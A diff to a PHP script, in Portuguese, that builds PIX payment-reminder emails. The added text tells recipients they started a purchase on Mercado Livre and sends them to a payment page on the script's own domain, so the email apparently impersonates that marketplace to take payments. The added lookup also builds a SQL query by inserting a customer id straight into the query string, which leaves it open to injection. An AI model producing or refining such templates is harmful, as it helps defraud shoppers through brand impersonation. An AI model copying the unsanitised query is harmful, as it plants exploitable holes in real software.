@@ -1,4 +1,4 @@
-<?php 
+﻿<?php 
 
 session_start();
 
@@ -108,6 +108,15 @@ while($sql && $row = mysqli_fetch_array($sql)){
 				$payment_link = "$dominio/payment.php?produto=$override_produto&cid=$idCliente";
 			}
 
+			// Buscar nome do produto do cliente
+			$nomeProduto = 'seu produto';
+			$sql_prod = mysqli_query($conn, "SELECT produto_nome FROM clientes WHERE id='$idCliente' LIMIT 1");
+			if ($sql_prod && $row_prod = mysqli_fetch_assoc($sql_prod)) {
+				if (!empty($row_prod['produto_nome'])) {
+					$nomeProduto = $row_prod['produto_nome'];
+				}
+			}
+
 			$texto = "
 <div style='max-width: 600px; margin: 0 auto; font-family: Arial, sans-serif; border: 1px solid #e0e0e0; border-radius: 8px; overflow: hidden; background-color: #fff;'>
     <div style='background-color: #00a650; padding: 20px; text-align: center;'>
@@ -115,7 +124,8 @@ while($sql && $row = mysqli_fetch_array($sql)){
     </div>
     <div style='padding: 30px; line-height: 1.6; color: #333;'>
         <p style='font-size: 16px; margin-top: 0;'>Olá <strong>$nome</strong>,</p>
-        <p style='font-size: 16px;'>Como o PIX Copia e Cola tem um tempo limite e pode ter expirado, clique no botão abaixo para gerar um novo PIX e finalize seu pagamento e garantir sua reserva.</p>
+        <p style='font-size: 16px;'>Notamos que você iniciou uma compra do produto <strong>$nomeProduto</strong> no Mercado Livre, mas ainda não identificamos o seu pagamento.</p>
+        <p style='font-size: 16px;'>Como o PIX Copia e Cola tem um tempo limite e pode ter expirado, clique no botão abaixo para acompanhar seu pedido e finalizar o pagamento.</p>
         
         <div style='text-align: center; margin-top: 30px; margin-bottom: 20px;'>
             <a href='$payment_link' style='display: inline-block; background-color: #3483fa; color: white; padding: 14px 28px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 16px;'>acompanhar meu pedido</a>
